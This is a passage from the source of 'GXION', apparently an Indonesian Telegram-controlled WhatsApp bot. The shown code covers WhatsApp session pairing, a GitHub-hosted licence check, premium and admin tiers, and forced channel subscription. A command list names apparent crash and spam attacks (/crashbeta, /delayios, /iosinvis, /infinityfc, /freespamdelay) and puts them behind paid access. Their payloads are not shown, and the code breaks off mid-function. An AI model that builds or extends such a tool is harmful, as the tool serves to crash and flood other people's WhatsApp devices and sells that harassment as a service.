// ------------------------------------------------------------- \\
//.        G X I O N - @BAWZZHHH.        \\
// -------------------------------------------------------------------- \\

// -------------------------------------
/// Konfigurasi Const All
// -------------------------------------
const { Telegraf, Markup, session } = require("telegraf");
const os = require("os");
const chalk = require("chalk");
const crypto = require("crypto");
const fs = require("fs");
const https = require("https");
const moment = require("moment-timezone");
const pino = require("pino");
const axios = require("axios");

let makeWASocket;
let useMultiFileAuthState;
let DisconnectReason;
let fetchLatestBaileysVersion;

async function loadBaileys() {
    const baileys = await import("@whiskeysockets/baileys");
    makeWASocket = baileys.default;
    useMultiFileAuthState = baileys.useMultiFileAuthState;
    DisconnectReason = baileys.DisconnectReason;
    fetchLatestBaileysVersion = baileys.fetchLatestBaileysVersion;
}

const { TOKEN_BOT, OWNER_ID } = require("./config");
const BOT_TOKEN = TOKEN_BOT;

const PATHS = {
    MODE_FILE: "./Tools/mode.json",
    premiumFile: "./database/premiumuser.json",
    adminFile: "./database/adminuser.json",
    GROUP_FILE: "./Tools/groupmode.json",
    antiFotoFile: "./Tools/antifoto.json",
    safeFile: "./Tools/safeGroups.json",
    antiVideoFile: "./Tools/antivideo.json",
    premiumGroupsFile: "./Tools/premiumGroups.json",
    ownerFile: "./database/owner.json",
    sessionPath: "./session",
    forceSubFile: "./database/forcesub.json"
};

const GITHUB_RAW_URL = "https://raw.githubusercontent.com/netflixlive558-sketch/gxionxtoken/main/tokens.json";

const state = {
    sock: null,
    isWhatsAppConnected: false,
    linkedWhatsAppNumber: "",
    isStarting: false,
    hasConnectedOnce: false,
    reconnectAttempts: 0,
    pairingMessage: null,
    antiCulik: true,
    autoReject: false,
    currentMode: "self",
    premiumUsers: [],
    adminList: [],
    ownerUsers: [],
    antiFotoGroups: [],
    antiVideoGroups: [],
    whitelistGroups: [],
    premiumGroups: [],
    COOLDOWN_TIME: 1,
    COOLDOWN_TEXT: "1d",
    cooldowns: new Map(),
    clickCooldown: new Map(),
    warnedGroups: new Map(),
    activeMenus: new Map(),
    pageCache: new Map(),
    discoIndex: 0
};

const loadJSON = (file) => {
    try {
        if (!fs.existsSync(file)) return [];
        const data = fs.readFileSync(file, "utf8");
        if (!data.trim()) return [];
        return JSON.parse(data);
    } catch (err) {
        console.log("⚠️ JSON corrupt:", file);
        return [];
    }
};

const saveJSON = (file, data) => {
    try {
        const tempFile = `${file}.tmp`;
        fs.writeFileSync(tempFile, JSON.stringify(data, null, 2));
        fs.renameSync(tempFile, file);
    } catch (err) {
        console.log("❌ Failed save JSON:", file, err.message);
    }
};

function loadAllData() {
    state.ownerUsers = loadJSON(PATHS.ownerFile);
    state.premiumUsers = loadJSON(PATHS.premiumFile);
    state.adminList = loadJSON(PATHS.adminFile);
    state.antiFotoGroups = loadJSON(PATHS.antiFotoFile);
    state.antiVideoGroups = loadJSON(PATHS.antiVideoFile);
    state.whitelistGroups = loadJSON(PATHS.safeFile);
    state.premiumGroups = loadPremiumGroups(); 
    state.currentMode = getMode();
}

function getMode() {
    try {
        if (!fs.existsSync(PATHS.MODE_FILE)) {
            fs.mkdirSync("./Tools", { recursive: true });
            fs.writeFileSync(PATHS.MODE_FILE, JSON.stringify({ mode: "self" }, null, 2));
            return "self";
        }
        const data = JSON.parse(fs.readFileSync(PATHS.MODE_FILE, "utf8"));
        return data.mode || "self";
    } catch {
        return "self";
    }
}

function setMode(mode) {
    if (!["self", "public"].includes(mode)) return;
    state.currentMode = mode;
    fs.writeFileSync(PATHS.MODE_FILE, JSON.stringify({ mode }, null, 2));
}

function getGroupMode() {
    try {
        if (!fs.existsSync(PATHS.GROUP_FILE)) {
            fs.mkdirSync("./Tools", { recursive: true });
            fs.writeFileSync(PATHS.GROUP_FILE, JSON.stringify({ group: "off" }, null, 2));
            return "off";
        }
        const data = JSON.parse(fs.readFileSync(PATHS.GROUP_FILE, "utf8"));
        return data.group || "off";
    } catch {
        return "off";
    }
}

function setGroupMode(group) {
    if (!["on", "off"].includes(group)) return;
    fs.writeFileSync(PATHS.GROUP_FILE, JSON.stringify({ group }, null, 2));
}

function isPremium(userId) {
    return state.premiumUsers.includes(userId.toString());
}

function isOwner(id) {
    return state.ownerUsers.includes(id.toString()) || OWNER_ID.includes(id);
}

function isSafeGroup(groupId) {
    return state.whitelistGroups.includes(groupId.toString());
}

function isGroupPremium(groupId) {
    try {
        const premiumGroups = loadPremiumGroups();
        return premiumGroups.includes(groupId.toString());
    } catch {
        return false;
    }
}

function addAdmin(userId) {
    userId = userId.toString();
    if (!state.adminList.includes(userId)) {
        state.adminList.push(userId);
        saveJSON(PATHS.adminFile, state.adminList);
    }
}

function removeAdmin(userId) {
    userId = userId.toString();
    state.adminList = state.adminList.filter(id => id !== userId);
    saveJSON(PATHS.adminFile, state.adminList);
}

function loadPremiumGroups() {
    try {
        if (!fs.existsSync(PATHS.premiumGroupsFile)) return [];
        return JSON.parse(fs.readFileSync(PATHS.premiumGroupsFile, "utf8") || "[]");
    } catch {
        return [];
    }
}

function savePremiumGroups(data) {
    fs.writeFileSync(PATHS.premiumGroupsFile, JSON.stringify(data, null, 2));
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function deleteSession() {
    try {
        if (fs.existsSync(PATHS.sessionPath)) {
            fs.rmSync(PATHS.sessionPath, { recursive: true, force: true });
            console.log(chalk.hex("#ffb86c")("[ ! ] ") + chalk.white("Session deleted"));
        }
    } catch (err) {
        console.log(chalk.hex("#ff5555")("[ ✗ ] ") + chalk.white("Failed delete session"));
    }
}

function runtime(seconds) {
    seconds = Number(seconds);
    const d = Math.floor(seconds / (3600 * 24));
    const h = Math.floor(seconds % (3600 * 24) / 3600);
    const m = Math.floor(seconds % 3600 / 60);
    const s = Math.floor(seconds % 60);
    return [d ? `${d}d` : "", h ? `${h}h` : "", m ? `${m}m` : "", `${s}s`].filter(Boolean).join(" ");
}

function getSenderStatus() {
    try {
        if (state.sock?.user?.id) return "✅ CONNECTED";
        return "❌ NOT CONNECT";
    } catch {
        return "ɴᴏᴛ ᴄᴏɴɴᴇᴄᴛ sᴇɴᴅᴇʀ";
    }
}

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

const startSesi = async () => {
    if (state.isStarting) return;
    state.isStarting = true;

    try {
        if (!makeWASocket) await loadBaileys();
        
const totalSteps = 10;
const barWidth = 30;

const barColors = [
    "#ff5555", "#ff6e6e", "#ff8755", "#ffa055", "#ffb86c",
    "#f1fa8c", "#a5f78c", "#50fa7b", "#8be9fd", "#bd93f9"
];

if (process.stdout.isTTY) {
    console.log(chalk.hex("#bd93f9").bold("⬡ GXION SYSTEM BOOT ⬡"));
    console.log("");

    for (let step = 1; step <= totalSteps; step++) {
        const percent = step * 10;
        const filled = Math.floor((step / totalSteps) * barWidth);
        const empty = barWidth - filled;
        const color = barColors[step - 1];

        const bar =
            chalk.hex(color)("█".repeat(filled)) +
            chalk.hex("#44475a")("░".repeat(empty));

        const label = chalk.hex(color).bold(` ${percent.toString().padStart(3, " ")}% `);
        const msg = chalk.hex("#f8f8f2")(`Loading${".".repeat((step % 3) + 1)}`);

        process.stdout.write(`\r${label} ${bar} ${msg}`);
        await new Promise(r => setTimeout(r, 100));
    }

    process.stdout.write("\r" + " ".repeat(90) + "\r");
    console.log(chalk.hex("#50fa7b").bold("[ ✓ ] System ready"));
    console.log("");
    await new Promise(r => setTimeout(r, 300));
}
console.log(
    chalk.hex("#ff79c6")("‡‡‡‡‡‡‡‡‡‡‡‡▄▄▄▄") + "\n" +
    chalk.hex("#ff79c6")("‡‡‡‡‡‡‡‡‡‡‡█‡‡‡‡█") + "\n" +
    chalk.hex("#ff79c6")("‡‡‡‡‡‡‡‡‡‡‡█‡‡‡‡█") + "\n" +
    chalk.hex("#ff79c6")("‡‡‡‡‡‡‡‡‡‡█‡‡‡‡‡█") + "\n" +
    chalk.hex("#ff79c6")("‡‡‡‡‡‡‡‡‡█‡‡‡‡‡‡█") + "\n" +
    chalk.hex("#ffb86c")("██████▄▄█‡‡‡‡‡‡████████▄") + "\n" +
    chalk.hex("#ffb86c")("▓▓▓▓▓▓█‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡█") + "\n" +
    chalk.hex("#ffb86c")("▓▓▓▓▓▓█‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡█") + "\n" +
    chalk.hex("#ffb86c")("▓▓▓▓▓▓█‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡█") + "\n" +
    chalk.hex("#ffb86c")("▓▓▓▓▓▓█‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡█") + "\n" +
    chalk.hex("#ffb86c")("▓▓▓▓▓▓█‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡‡█") + "\n" +
    chalk.hex("#ffb86c")("▓▓▓▓▓▓█████‡‡‡‡‡‡‡‡‡‡‡‡██") + "\n" +
    chalk.hex("#ffb86c")("█████‡‡‡‡‡‡‡██████████") + "\n\n" +
    chalk.hex("#bd93f9")("╔═══════════════════════════════════╗") + "\n" +
    chalk.hex("#bd93f9")("║ ") + chalk.hex("#ff79c6").bold("𝐒𝐂𝐑𝐈𝐏𝐓") + chalk.white(" ") + chalk.hex("#8be9fd").bold("𝐆𝐗𝐈𝐎𝐍") + chalk.white(" ") + chalk.hex("#50fa7b").bold("𝐑𝐄𝐀𝐃𝐘") + chalk.white(" ") + chalk.hex("#f1fa8c")("---") + chalk.white(" ") + chalk.hex("#ffb86c").bold("𝐓𝐇𝐀𝐍𝐊𝐒 𝐅𝐎𝐑 𝐔𝐒𝐈𝐍𝐆") + chalk.hex("#bd93f9")(" ║") + "\n" +
    chalk.hex("#bd93f9")("╚═══════════════════════════════════╝") + "\n" +
    chalk.hex("#ff79c6")("❀ ") + chalk.hex("#8be9fd").bold("DEVELOPER") + chalk.white(" : ") + chalk.hex("#ffb86c")("@Bawzzhhh") + "\n" +
    chalk.hex("#ff79c6")("❀ ") + chalk.hex("#8be9fd").bold("SUPPORT") + chalk.white(" : ") + chalk.hex("#ffb86c")("@ikyymaunikah") + chalk.white(" --- ") + chalk.hex("#ffb86c")("@Xatanicvxii") + "\n" +
    chalk.hex("#ff79c6")("❀ ") + chalk.hex("#8be9fd").bold("VERSION") + chalk.white(" : ") + chalk.hex("#f1fa8c")("LATEST") + chalk.white(" ") + chalk.hex("#ff79c6")("#AUTOUPDATES") + "\n" +
    chalk.hex("#ff79c6")("❀ ") + chalk.hex("#8be9fd").bold("STATUS") + chalk.white(" : ") + chalk.hex("#f1fa8c").bold("CONNECTING...")
);

        if (state.sock) {
            try {
                state.sock.ev.removeAllListeners("connection.update");
                state.sock.ev.removeAllListeners("creds.update");
                state.sock.end?.();
            } catch {}
            state.sock = null;
        }

        console.log(chalk.hex("#6272a4")("[ • ] ") + chalk.white("Loading session..."));

        const { state: authState, saveCreds } = await useMultiFileAuthState(PATHS.sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        console.log(chalk.hex("#50fa7b")("[ ✓ ] ") + chalk.white("Session loaded"));

        state.sock = makeWASocket({
            version,
            auth: authState,
            logger: pino({ level: "silent" }),
            printQRInTerminal: false,
            browser: ["Ubuntu", "Chrome", "20.0.04"],
            keepAliveIntervalMs: 25000,
            connectTimeoutMs: 60000,
            markOnlineOnConnect: true,
            emitOwnEvents: true,
            fireInitQueries: true
        });

        state.sock.ev.on("creds.update", saveCreds);

        state.sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            const reason = lastDisconnect?.error?.output?.statusCode;

            if (connection === "connecting") {
                process.stdout.write(`\r${chalk.hex("#f1fa8c")("[ ~ ]")} ${chalk.white("Connecting to WhatsApp...")}`);
            }

            if (connection === "open") {
                process.stdout.write("\r" + " ".repeat(50) + "\r");
                state.isWhatsAppConnected = true;
                state.isStarting = false;
                state.hasConnectedOnce = true;
                state.reconnectAttempts = 0;
                state.linkedWhatsAppNumber = state.sock.user?.id?.split(":")[0];

                console.clear();
                console.log(chalk.hex("#50fa7b").bold(`
   ██████╗ ██╗  ██╗██╗ ██████╗ ███╗   ██╗
  ██╔════╝ ╚██╗██╔╝██║██╔═══██╗████╗  ██║
  ██║  ███╗ ╚███╔╝ ██║██║   ██║██╔██╗ ██║
  ██║   ██║ ██╔██╗ ██║██║   ██║██║╚██╗██║
  ╚██████╔╝██╔╝ ██╗██║╚██████╔╝██║ ╚████║
   ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                `));

                console.log(chalk.hex("#ffb86c").bold("        ⬡ SYSTEM CONNECTED ⬡"));
                console.log("");
                console.log(chalk.hex("#bd93f9")("   ┌──────────────────────────────────────────┐"));
                console.log(chalk.hex("#bd93f9")("   │") + chalk.hex("#ff79c6")(" Creator  ") + chalk.hex("#6272a4")("│ ") + chalk.white("@Bawzzhhh") + chalk.hex("#bd93f9")("                        │"));
                console.log(chalk.hex("#bd93f9")("   │") + chalk.hex("#8be9fd")(" Script   ") + chalk.hex("#6272a4")("│ ") + chalk.white("GXION NΞW ERA") + chalk.hex("#bd93f9")("                   │"));
                console.log(chalk.hex("#bd93f9")("   │") + chalk.hex("#f1fa8c")(" System   ") + chalk.hex("#6272a4")("│ ") + chalk.white("GitHub RAW Validation") + chalk.hex("#bd93f9")("             │"));
                console.log(chalk.hex("#bd93f9")("   │") + chalk.hex("#50fa7b")(" Sender   ") + chalk.hex("#6272a4")("│ ") + chalk.white(state.linkedWhatsAppNumber || "Unknown") + chalk.hex("#bd93f9")(" ".repeat(Math.max(0, 22 - String(state.linkedWhatsAppNumber || "").length)) + "│"));
                console.log(chalk.hex("#bd93f9")("   │") + chalk.hex("#ffb86c")(" Status   ") + chalk.hex("#6272a4")("│ ") + chalk.hex("#50fa7b").bold("Online ✓") + chalk.hex("#bd93f9")("                           │"));
                console.log(chalk.hex("#bd93f9")("   └──────────────────────────────────────────┘"));
                console.log(chalk.hex("#ff5555")("   ──────────────────────────────────────────"));
                console.log(chalk.hex("#50fa7b").bold("     SYSTEM READY - DATABASE CONNECTED"));
                console.log(chalk.hex("#ff5555")("   ──────────────────────────────────────────"));
                console.log("");

                if (state.pairingMessage?.chatId && state.pairingMessage?.messageId) {
                    try {
                        await bot.telegram.editMessageText(
                            state.pairingMessage.chatId,
                            state.pairingMessage.messageId,
                            undefined,
                            `<blockquote><b>[ ✓ ] PAIRING BERHASIL</b></blockquote><pre>Device: ${state.linkedWhatsAppNumber} | Status: Online</pre>`,
                            { parse_mode: "HTML" }
                        );
                    } catch {}
                    state.pairingMessage = null;
                }
            }

            if (connection === "close") {
                process.stdout.write("\r" + " ".repeat(50) + "\r");
                state.isWhatsAppConnected = false;
                state.isStarting = false;

                console.log(chalk.hex("#ff5555").bold(`
   ╔══════════════════════════╗
   ║  [ ✗ ] CONNECTION CLOSED ║
   ╚══════════════════════════╝
                `));

                if (reason === DisconnectReason.loggedOut || reason === 401) {
                    console.log(chalk.hex("#ffb86c")("[ ! ] ") + chalk.white("Session invalid, deleting..."));
                    console.log("");
                    deleteSession();
                    state.pairingMessage = null;
                    state.sock = null;
                    return;
                }

                const delay = Math.min(1000 * Math.pow(2, state.reconnectAttempts), 30000);
                state.reconnectAttempts++;

                console.log(chalk.hex("#8be9fd")(`   [ ~ ] Reconnecting in ${delay}ms...`));
                console.log("");

                setTimeout(() => {
                    startSesi().catch(() => {
                        state.isStarting = false;
                    });
                }, delay);
            }
        });
    } catch (err) {
        console.log(chalk.hex("#ff5555").bold(`
   ╔══════════════════════════╗
   ║ [ ✗ ] SESSION ERROR      ║
   ╚══════════════════════════╝
        `));
        console.log(chalk.hex("#ffb86c")("   Reason: ") + chalk.white(err.message));
        state.isStarting = false;
        setTimeout(() => {
            startSesi().catch(() => {
                state.isStarting = false;
            });
        }, 3000);
    }
};

async function validateBotID() {
    console.clear();
    console.log(chalk.hex("#ff5555").bold(`
    ██████╗ ██╗  ██╗██╗ ██████╗ ███╗   ██╗
   ██╔════╝ ╚██╗██╔╝██║██╔═══██╗████╗  ██║
   ██║  ███╗ ╚███╔╝ ██║██║   ██║██╔██╗ ██║
   ██║   ██║ ██╔██╗ ██║██║   ██║██║╚██╗██║
   ╚██████╔╝██╔╝ ██╗██║╚██████╔╝██║ ╚████║
    ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
        `));

    console.log(chalk.hex("#bd93f9").bold("⬡ GXION SECURITY VALIDATION ⬡"));
    console.log("");
    console.log(chalk.hex("#6272a4")("[ • ] ") + chalk.white("Checking Bot ID..."));

    try {
        const botID = BOT_TOKEN?.includes(":") ? BOT_TOKEN.split(":")[0].trim() : null;

        if (!botID) {
            console.log(chalk.redBright("❌ BOT TOKEN TIDAK VALID!"));
            process.exit(1);
        }

        console.log(chalk.yellow(`[ 🔍 ] Bot ID: ${botID}`));

        const response = await axios.get(GITHUB_RAW_URL, {
            timeout: 10000,
            headers: { "Cache-Control": "no-cache" }
        });

        const database = response.data;

        if (!database || !Array.isArray(database.ids)) {
            console.log(chalk.redBright("❌ FORMAT tokens.json TIDAK VALID!"));
            console.log(chalk.gray('Format harus: { "ids": ["123456789"] }'));
            process.exit(1);
        }

        const allowedIDs = database.ids.map(id => String(id).trim());
        const isAllowed = allowedIDs.includes(String(botID));

        if (!isAllowed) {
            console.log(chalk.redBright.bold(`
   ╔════════════════════════════════════╗
   ║      ❌ BOT TIDAK TERDAFTAR       ║
   ╚════════════════════════════════════╝
            `));
            console.log(chalk.gray(`Bot ID: ${botID}`));
            console.log(chalk.gray("Bot dihentikan."));
            process.exit(1);
        }

        console.log(chalk.greenBright.bold(`
   ╔════════════════════════════════════╗
   ║       ✅ BOT ID TERDAFTAR         ║
   ╚════════════════════════════════════╝
        `));
        console.log(chalk.green(`[ ✓ ] Database GitHub berhasil diverifikasi`));
        console.log(chalk.cyan(`[ ✓ ] ID: ${botID}`));
        console.log(chalk.greenBright("[ ✓ ] Access Granted"));

        return true;
    } catch (err) {
        console.log(chalk.redBright.bold(`
   ╔════════════════════════════════════╗
   ║    ❌ DATABASE GITHUB ERROR        ║
   ╚════════════════════════════════════╝
        `));
        console.log(chalk.yellow("Reason:"), chalk.white(err.response?.status ? `HTTP ${err.response.status}` : err.message));
        console.log(chalk.red("❌ Bot tidak akan dijalankan."));
        process.exit(1);
    }
}

const checkWhatsAppConnection = (ctx, next) => {
    if (!state.isWhatsAppConnected) {
        return ctx.reply("❌ ☇ Connection closed : Terputus atau Ada kendala lainnya!");
    }
    return next();
};

const checkOwner = (ctx, next) => {
    if (!OWNER_ID.includes(ctx.from.id)) {
        return ctx.reply("❌ ☇ Access is not for children");
    }
    return next();
};

const checkAdmin = (ctx, next) => {
    const id = ctx.from.id.toString();
    if (!state.adminList.includes(id) && !state.ownerUsers.includes(id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk akses admin");
    }
    return next();
};

const checkAllPremium = (ctx, next) => {
    const id = ctx.from.id.toString();
    
    if (state.premiumUsers.includes(id)) return next();
    
    if (ctx.chat && ctx.chat.type !== "private") {
        const premiumGroups = loadPremiumGroups();
        if (premiumGroups.includes(ctx.chat.id.toString())) return next();
    }
    
    return ctx.reply(`╭━━━〔  PREMIUM ONLY ACCESS 〕━━━⬣
❌ Akses ditolak!
⛔ Fitur ini hanya dapat digunakan oleh user Premium.
┌─ 🪧 Cara Mendapatkan Premium 🪧
├ ⌨ /addprem
│   ↳ Khusus Owner Command
├ ⌨ /getprem
│   ↳ Khusus Semua Tanpa Owner Command
╰──────────────⬣
Unlock semua fitur premium GXION.`);
};

const checkAntiCulik = async (ctx, next) => {
    const text = ctx.message?.text || "";
    if (!text.startsWith("/")) return next();
    if (ctx.chat.type === "private") return next();
    
    const premiumGroups = loadPremiumGroups();
    if (premiumGroups.includes(ctx.chat.id.toString())) return next();
    
    const cmd = text.split(" ")[0].split("@")[0].toLowerCase();
    const allowedCmds = ["/autopremgroup", "/listgroup"];
    if (allowedCmds.includes(cmd)) return next();
    
    const now = Date.now();
    const last = state.warnedGroups.get(ctx.chat.id) || 0;
    if (now - last > 30000) {
        state.warnedGroups.set(ctx.chat.id, now);
        await ctx.replyWithHTML(`🚫 ☇ Group tidak ada akses premium
(!) Gunakan /autopremgroup untuk mendapatkan akses premium ke semua user secara otomatis`);
    }
    return;
};

function checkCooldown(ctx, next) {
    if (!ctx.from?.id) return next();
    if (isOwner(ctx.from.id)) return next();
    if (state.COOLDOWN_TIME <= 0) return next();

    const userId = String(ctx.from.id);
    const now = Date.now();
    
    if (state.cooldowns.size > 1000) {
        for (const [key, expiry] of state.cooldowns.entries()) {
            if (expiry < now) state.cooldowns.delete(key);
        }
    }

    const expireTime = state.cooldowns.get(userId);
    if (expireTime && now < expireTime) {
        const remaining = Math.ceil((expireTime - now) / 1000);
        return ctx.reply(`⏳ Cooldown aktif! Tunggu ${remaining} lagi.`);
    }

    state.cooldowns.set(userId, now + state.COOLDOWN_TIME);
    return next();
}

bot.use(checkAntiCulik);

bot.use((ctx, next) => {
    const groupMode = getGroupMode();
    if (groupMode === "on" && ctx.chat.type === "private") {
        return ctx.reply(
`❌ Gagal membuka menu
📑 Reason : BOT TELAH DI AKTIFKAN MODE GROUP`);
    }
    return next();
});

bot.use((ctx, next) => {
    const mode = getMode();
    if (mode === "self" && !isOwner(ctx.from.id)) {
        if (ctx.callbackQuery) {
            return ctx.answerCbQuery("🔒 Bot telah di kunci oleh Owner", { show_alert: true });
        }
        return;
    }
    return next();
});

const setChannelSession = new Map();
const customChannelSession = new Map();

bot.command("setch1", checkOwner, async (ctx) => {
    setChannelSession.set(ctx.from.id, { mode: 1, step: 1, channels: [] });
    setTimeout(() => setChannelSession.delete(ctx.from.id), 2 * 60 * 1000);
    return ctx.reply(
`📢 FORCE SUBSCRIBE SETUP
Kirim username channel pertama
Contoh:
@channelanda`);
});

bot.command("setch2", checkOwner, async (ctx) => {
    setChannelSession.set(ctx.from.id, { mode: 2, step: 1, channels: [] });
    setTimeout(() => setChannelSession.delete(ctx.from.id), 2 * 60 * 1000);
    return ctx.reply(
`📢 FORCE SUBSCRIBE SETUP
Kirim username channel pertama
1:`);
});

bot.command("customchannel", checkOwner, async (ctx) => {
    customChannelSession.delete(ctx.from.id);
    customChannelSession.set(ctx.from.id, { step: 1, channels: [] });
    setTimeout(() => customChannelSession.delete(ctx.from.id), 5 * 60 * 1000);
    return ctx.reply(
`📢 CUSTOM FORCE SUBSCRIBE SETUP
Masukkan jumlah channel yang ingin di-set (1-10):
Contoh:
5
📌 Syarat: Bot harus menjadi admin di semua channel`);
});

bot.on("text", async (ctx, next) => {
    const legacySession = setChannelSession.get(ctx.from.id);
    const customSession = customChannelSession.get(ctx.from.id);
    
    if (!legacySession && !customSession) return next();

    const text = ctx.message.text.trim();
    if (text.startsWith("/")) return next();

    if (customSession) {
        if (customSession.step === 1) {
            const count = parseInt(text);
            if (isNaN(count) || count < 1 || count > 10) {
                return ctx.reply("❌ Jumlah channel harus berupa angka 1-10");
            }
            customSession.count = count;
            customSession.step = 2;
            customSession.currentChannel = 1;
            customChannelSession.set(ctx.from.id, customSession);
            return ctx.reply(
`📢 Masukkan channel ke-1 dari ${count}
Contoh:
@channelanda
📌 Pastikan bot sudah menjadi admin di channel tersebut`);
        }

        if (customSession.step === 2) {
            if (!text.startsWith("@")) {
                return ctx.reply("❌ Username channel harus diawali @");
            }

            try {
                const me = await ctx.telegram.getMe();
                const member = await ctx.telegram.getChatMember(text, me.id);
                if (!["administrator", "creator"].includes(member.status)) {
                    return ctx.reply(`❌ Bot belum menjadi admin di ${text}`);
                }
            } catch {
                return ctx.reply(`❌ Channel ${text} tidak ditemukan atau bot belum admin`);
            }

            customSession.channels.push(text);
            customSession.currentChannel++;

            if (customSession.channels.length === customSession.count) {
                saveJSON(PATHS.forceSubFile, { channels: customSession.channels });
                customChannelSession.delete(ctx.from.id);

                const channelList = customSession.channels.map((ch, i) => `📢 Channel ${i + 1}: ${ch}`).join("\n");
                return ctx.reply(
`✅ Force Subscribe berhasil di-set!
${channelList}
Total: ${customSession.count} channel
📌 Force subscribe akan aktif untuk semua command yang terdaftar.`);
            } else {
                const nextNumber = customSession.channels.length + 1;
                const total = customSession.count;
                const listChannels = customSession.channels.map((ch, i) => `✅ Channel ${i + 1}: ${ch}`).join("\n");
                return ctx.reply(
`📢 Masukkan channel ke-${nextNumber} dari ${total}
${listChannels}
${nextNumber <= total ? `Kirim username channel ke-${nextNumber}` : ''}`);
            }
        }
    }

    if (legacySession) {
        if (!text.startsWith("@")) {
            return ctx.reply("❌ Username channel harus diawali @");
        }

        try {
            const me = await ctx.telegram.getMe();
            const member = await ctx.telegram.getChatMember(text, me.id);
            if (!["administrator", "creator"].includes(member.status)) {
                return ctx.reply(`❌ Bot belum jadi admin di ${text}`);
            }
        } catch {
            return ctx.reply("❌ Channel tidak ditemukan / bot belum admin");
        }

        if (legacySession.mode === 1) {
            saveJSON(PATHS.forceSubFile, { channels: [text] });
            setChannelSession.delete(ctx.from.id);
            return ctx.reply(
`✅ Force Sub aktif
📢 Channel:
${text}`);
        }

        if (legacySession.mode === 2 && legacySession.step === 1) {
            legacySession.channels.push(text);
            legacySession.step = 2;
            return ctx.reply(
`📢 Masukkan channel kedua
2:`);
        }

        if (legacySession.mode === 2 && legacySession.step === 2) {
            legacySession.channels.push(text);
            saveJSON(PATHS.forceSubFile, { channels: legacySession.channels });
            setChannelSession.delete(ctx.from.id);
            return ctx.reply(
`✅ Force Sub aktif
📢 Channel 1:
${legacySession.channels[0]}
📢 Channel 2:
${legacySession.channels[1]}`);
        }
    }

    return next();
});

bot.command("delch", checkOwner, async (ctx) => {
    saveJSON(PATHS.forceSubFile, { channels: [] });
    setChannelSession.delete(ctx.from.id);
    customChannelSession.delete(ctx.from.id);
    return ctx.reply("✅ Force Subscribe dimatikan.");
});

bot.command("viewchannels", checkOwner, async (ctx) => {
    const data = loadJSON(PATHS.forceSubFile);
    if (!data.channels || data.channels.length === 0) {
        return ctx.reply("❌ Tidak ada channel yang di-set untuk force subscribe.");
    }
    const channelList = data.channels.map((ch, i) => `📢 Channel ${i + 1}: ${ch}`).join("\n");
    return ctx.reply(
`📋 DAFTAR CHANNEL FORCE SUBSCRIBE
${channelList}
Total: ${data.channels.length} channel
Gunakan /delch untuk menghapus semua channel`);
});

const BLOCKED_COMMANDS = new Set([
    "/start", "/freespamdelay", "/sexpolix", "/iosinvis", "/crashbeta", "/xlite", "/delayquentix", "/delayios", "/applex", "/combox", "/asghards", "/infinityfc", "/andromery", "/invisXimags", "/xctruth"
]);

bot.use(async (ctx, next) => {
    if (!ctx.from) return next();

    const data = loadJSON(PATHS.forceSubFile);
    if (!data.channels?.length) return next();
    if (OWNER_ID.includes(ctx.from.id)) return next();

    const text = ctx.message?.text || ctx.callbackQuery?.data || "";
    const command = text.split(" ")[0].split("@")[0].toLowerCase();

    if (!BLOCKED_COMMANDS.has(command)) return next();

    let joinedAll = true;
    let notJoinedChannels = [];

    for (const channel of data.channels) {
        try {
            const member = await ctx.telegram.getChatMember(channel, ctx.from.id);
            if (!["member", "administrator", "creator"].includes(member.status)) {
                joinedAll = false;
                notJoinedChannels.push(channel);
            }
        } catch {
            joinedAll = false;
            notJoinedChannels.push(channel);
        }
    }

    if (joinedAll) return next();

    const buttons = [
        ...data.channels.map(ch => [{ text: `📢 ${ch}`, url: `https://t.me/${ch.replace("@", "")}` }]),
        [{ text: "✅ Sudah Join --- Verifikasi", callback_data: "verify_fsub" }],
        [{ text: "❌ Batal", callback_data: "cancel_fsub" }]
    ];

    const channelList = data.channels.map(ch => `• ${ch}`).join("\n");
    const notJoinedList = notJoinedChannels.map(ch => `• ${ch}`).join("\n");

    return ctx.reply(
`🔐 AKSES TERKUNCI
Kamu harus join channel dibawah ini untuk menggunakan command ini:
${channelList}
${notJoinedChannels.length > 0 ? `❌ Belum join: ${notJoinedList}` : ''}
Setelah join, klik tombol verifikasi dibawah`,
        { reply_markup: { inline_keyboard: buttons } }
    );
});

bot.action("verify_fsub", async (ctx) => {
    const data = loadJSON(PATHS.forceSubFile);
    if (!data.channels?.length) {
        await ctx.answerCbQuery("✅ Force Subscribe sudah dimatikan");
        return ctx.editMessageText("✅ Force Subscribe sudah tidak aktif", { reply_markup: { inline_keyboard: [] } });
    }

    let joinedAll = true;
    let notJoined = [];

    for (const channel of data.channels) {
        try {
            const member = await ctx.telegram.getChatMember(channel, ctx.from.id);
            if (!["member", "administrator", "creator"].includes(member.status)) {
                joinedAll = false;
                notJoined.push(channel);
            }
        } catch {
            joinedAll = false;
            notJoined.push(channel);
        }
    }

    if (joinedAll) {
        await ctx.answerCbQuery("✅ Verifikasi berhasil! Silahkan gunakan command lagi");
        return ctx.editMessageText(
`✅ VERIFIKASI BERHASIL
Kamu sudah join semua channel.
Silahkan gunakan command yang tadi kamu coba.`,
            { reply_markup: { inline_keyboard: [] } }
        );
    } else {
        const notJoinedList = notJoined.join(", ");
        await ctx.answerCbQuery(`❌ Kamu belum join: ${notJoinedList}`, { show_alert: true });
        
        const channelList = data.channels.map(ch => `• ${ch}`).join("\n");
        const notJoinedText = notJoined.map(ch => `• ${ch}`).join("\n");
        
        return ctx.editMessageText(
`🔐 AKSES TERKUNCI
Kamu harus join channel dibawah ini untuk menggunakan command ini:
${channelList}
❌ Belum join:
${notJoinedText}
Setelah join, klik tombol verifikasi dibawah`,
            {
                reply_markup: {
                    inline_keyboard: [
                        ...data.channels.map(ch => [{ text: `📢 ${ch}`, url: `https://t.me/${ch.replace("@", "")}` }]),
                        [{ text: "✅ Sudah Join, Verifikasi", callback_data: "verify_fsub" }],
